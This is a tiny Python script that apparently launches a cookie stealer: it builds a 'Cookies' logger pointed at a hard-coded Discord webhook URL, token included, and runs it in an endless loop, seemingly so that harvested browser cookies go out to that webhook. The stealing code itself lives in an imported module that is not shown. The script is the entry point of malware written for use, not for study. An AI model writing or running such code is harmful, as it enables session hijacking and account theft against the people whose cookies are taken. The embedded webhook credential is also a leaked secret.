from logger import Cookies

log = Cookies('https://discord.com/api/webhooks/1232399994192003142/eosnMOhCsdYA4bFn-UIgvTBbKVh0oxtSI4xr0stfZOJV0xkLg3rAzP_nkYyiL5p1IQw2')

def main():
  while True:
	log.run_all()

if __name__ == '__main__':
	main()
